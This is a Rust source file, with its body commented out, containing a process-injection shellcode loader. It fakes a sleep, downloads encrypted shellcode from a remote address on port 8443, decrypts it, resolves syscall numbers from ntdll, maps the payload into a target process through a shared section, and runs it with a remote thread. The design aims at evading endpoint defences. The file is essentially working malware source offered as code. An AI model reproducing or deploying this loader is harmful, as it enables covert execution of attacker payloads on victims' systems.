// direct_syscalls.rs
/*
use crate::utils::{get_ssn, NtCreateSection, NtMapViewOfSection, NtCreateThreadEx};
use crate::download::get_contents;
use crate::crypt::decrypt_shellcode;
use crate::sleep::fake_sleep;

use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcess};
use winapi::um::winnt::{HANDLE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ, SEC_COMMIT, PROCESS_ALL_ACCESS};
use winapi::um::handleapi::CloseHandle;
use winapi::shared::ntdef::{LARGE_INTEGER};
use winapi::um::libloaderapi::GetModuleHandleA;
use std::ffi::c_void;
use std::ptr::null_mut;
use std::io::Error;

// === Variáveis globais acessíveis no Assembly ===
//#[no_mangle]
//pub static mut g_NtCreateSectionSSN: u32 = 0;
//#[no_mangle]
//pub static mut g_NtMapViewOfSectionSSN: u32 = 0;
//#[no_mangle]
//pub static mut g_NtCreateThreadExSSN: u32 = 0;

//#[no_mangle]
//pub static mut g_NtDelayExecutionSSN: u32 = 0;

macro_rules! info {
    ($msg:expr, $($args:expr),*) => {
        println!("[i] {}", format!($msg, $($args),*));
    };
    ($msg:expr) => {
        println!("[i] {}", $msg);
    };
}

pub async fn run_direct_loader(target_pid: u32) -> Result<(), Box<dyn std::error::Error>> {
    fake_sleep(10);

    let encrypted_shellcode = get_contents("http://192.168.119.128:8443/content.b64").await?;

    unsafe {
        let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if h_ntdll.is_null() {
            return Err("Failed to load ntdll.dll".into());
        }

        *(&mut g_NtCreateSectionSSN) = get_ssn(h_ntdll, "NtCreateSection")?;
        info!("{}", g_NtCreateSectionSSN);

        *(&mut g_NtMapViewOfSectionSSN) = get_ssn(h_ntdll, "NtMapViewOfSection")?;
        info!("{}", g_NtMapViewOfSectionSSN);

        *(&mut g_NtCreateThreadExSSN) = get_ssn(h_ntdll, "NtCreateThreadEx")?;

        info!("{}", g_NtCreateThreadExSSN);

        *(&mut g_NtDelayExecutionSSN) = get_ssn(h_ntdll, "NtDelayExecution")?;
        info!("{}", g_NtDelayExecutionSSN);

        let mut shellcode = decrypt_shellcode(&encrypted_shellcode)?;

        let mut section_handle: HANDLE = null_mut();
        let mut section_size: LARGE_INTEGER = std::mem::zeroed();
        *section_size.QuadPart_mut() = shellcode.len() as i64;

        let status = NtCreateSection(
            &mut section_handle,
            winapi::um::winnt::SECTION_MAP_READ
                | winapi::um::winnt::SECTION_MAP_WRITE
                | winapi::um::winnt::SECTION_MAP_EXECUTE,
            null_mut(),
            &mut section_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        );

        if status < 0 {
            return Err(format!("NtCreateSection failed with status: {:X}", status).into());
        }

        let mut local_section_address: *mut c_void = null_mut();
        let mut view_size = shellcode.len();

        let status = NtMapViewOfSection(
            section_handle,
            GetCurrentProcess(),
            &mut local_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_READWRITE,
        );

        if status < 0 {
            return Err(format!("NtMapViewOfSection (local) failed with status: {:X}", status).into());
        }

        let target_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid);
        if target_handle.is_null() {
            return Err(Error::last_os_error().into());
        }

        let mut remote_section_address: *mut c_void = null_mut();
        let status = NtMapViewOfSection(
            section_handle,
            target_handle,
            &mut remote_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_EXECUTE_READ,
        );

        if status < 0 {
            CloseHandle(target_handle);
            return Err(format!("NtMapViewOfSection (remote) failed with status: {:X}", status).into());
        }

        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            local_section_address as *mut u8,
            shellcode.len(),
        );

        let mut target_thread_handle: HANDLE = null_mut();
        let status = NtCreateThreadEx(
            &mut target_thread_handle,
            0x1FFFFF,
            null_mut(),
            target_handle,
            remote_section_address  as *mut winapi::ctypes::c_void,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        );

        if status < 0 {
            return Err(format!("NtCreateThreadEx failed with status: {:X}", status).into());
        }

        CloseHandle(target_handle);
        if !target_thread_handle.is_null() {
            CloseHandle(target_thread_handle);
        }
    }

    Ok(())
}
*/